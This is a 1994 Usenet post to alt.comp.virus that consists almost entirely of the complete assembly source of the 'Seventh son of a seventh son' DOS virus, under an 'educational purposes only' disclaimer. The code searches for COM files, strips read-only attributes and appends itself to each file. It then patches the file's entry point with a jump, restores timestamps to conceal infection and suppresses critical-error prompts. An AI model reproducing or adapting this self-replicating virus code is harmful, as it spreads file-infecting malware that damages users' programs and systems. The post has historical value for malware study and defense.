From netcom.com!ix.netcom.com!netnews Tue Nov 29 09:42:48 1994
Xref: netcom.com alt.comp.virus:506
Path: netcom.com!ix.netcom.com!netnews
From: Zeppelin@ix.netcom.com (Mr. G)
Newsgroups: alt.comp.virus
Subject: 7th Son Virus
Date: 29 Nov 1994 13:02:59 GMT
Organization: Netcom
Lines: 236
Distribution: world
Message-ID: <3bf8q3$iaj@ixnews1.ix.netcom.com>
References: <sbringerD00yHv.Hs3@netcom.com> <bradleymD011vJ.Lp8@netcom.com>
NNTP-Posting-Host: ix-pas2-10.ix.netcom.com

;***********************************************************************
*****
;*  Seventh son of a seventh son    version 4
;*
;*  Compile with MASM 4.0
;*  (other assemblers will probably not produce the same result)
;*
;*  Disclaimer:
;*  This file is only for educational purposes. The author takes no
;*  responsibility for anything anyone does with this file. Do not
;*  modify this file!
;***********************************************************************
*****

cseg            segment
                assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

                .RADIX  16

FILELEN         equ     end - start
MINTARGET       equ     1000d
MAXTARGET       equ     -(FILELEN+40)



;***********************************************************************
*****
;*              Dummy program (infected)
;***********************************************************************
*****

                org     100

begin:          db      4Dh                     ;virus mark
                db      0E9h, 4, 0              ;jump to virus entry


;***********************************************************************
*****
;*              Begin of the virus
;***********************************************************************
*****

start:          db      0CDh,  20h, 0, 0

                cld
                mov     si,0100h
                push    si                      ;push new IP on stack
                mov     di,si
                add     si,[si+2]               ;si -> start

                push    si                      ;restore original begin
                movsw
                movsw
                pop     si

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                cwd                             ;clear the flag
                inc     ax
                push    ax
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                lea     dx,[si+(offset ni24 - 0104)]  ;set new int24 
vector
                mov     ah,25h
                push    ax
                int     21

                mov     ah,2Fh                  ;get DTA adres
                int     21
                push    es
                push    bx

                add     dx,070h                 ;set new DTA adres
                mov     ah,1Ah
                int     21
                add     dx,1Eh
                push    dx

                lea     di,[si+(offset generation-0104)]  ;check 
generation
                cmp     [di],0707h
                jne     verder

                lea     dx,[di+2]               ;7th son of a 7th son!
                mov     ah,09h
                int     21

verder:         mov     ax,[di]                 ;update generations
                xchg    ah,al
                mov     al,1
                mov     [di],ax

                lea     dx,[di+33d]             ;find first COM-file
                xor     cx,cx
                mov     ah,4Eh
infloop:        int     21
                pop     dx
                jc      stop

                push    dx

                xor     cx,cx                   ;clear 
read-only-arttribute
                mov     ax,4301
                int     21
                jc      return1

                mov     ax,3D02h                ;open the file
                int     21
                jc      return1
                xchg    bx,ax

                mov     ax,5700h                ;get file date & time
                int     21
                push    cx
                push    dx

                mov     cx,4                    ;read begin of file
                mov     dx,si
                mov     ah,3fh
                int     21

                cmp     byte ptr [si],4Dh       ;already infected or an 
EXE?
                je      return2
                cmp     byte ptr [si],5Ah       ;or a weird EXE?
                je      return2

                mov     al,2                    ;go to end of file
                call    seek

                cmp     ax,MAXTARGET            ;check length of file
                jnb     return2
                cmp     ax,MINTARGET
                jbe     return2

                push    ax
                mov     cx,FILELEN              ;write program to end of 
file
                mov     ah,40h
                int     21
                cmp     ax,cx                   ;are all bytes written?
                pop     ax
                jnz     return2

                xchg    ax,bp
                mov     al,0                    ;go to begin of file
                call    seek

                mov     word ptr [si],0E94Dh    ;write mark and 
jump-command
                mov     word ptr [si+2],bp
                mov     ah,40h
                int     21

                inc     byte ptr [di]           ;number of next son

return2:        pop     dx                      ;restore file date & 
time
                pop     cx
                mov     ax,5701h
                int     21

                mov     ah,3Eh                  ;close the file
                int     21

return1:        mov     ah,4Fh                  ;find next file
                jmp     short infloop

stop:           pop     dx                      ;restore DTA adres
                pop     ds
                mov     ah,1Ah
                int     21

                pop     ax                      ;restore int24 vector
                pop     ds
                pop     dx
                int     21

                pop     ax                      ;restore ctrl-break flag
                pop     dx
                int     21

                push    cs
                push    cs
                pop     ds
                pop     es

                ret

seek:           mov     ah,42
                cwd
int21:          xor     cx,cx
                int     21
                mov     cl,4
                mov     dx,si
                ret


;***********************************************************************
*****
;*              Interupt handler 24
;***********************************************************************
*****

ni24:           mov     al,03
                iret


;***********************************************************************
*****
;*              Data
;***********************************************************************
*****

generation      db      1,1
sontxt          db      'Seventh son of a seventh son',0Dh, 0Ah, '$'
filename        db      '*.COM',0
                db      '‚¨°³±'

end:

cseg            ends
                end     begin

 


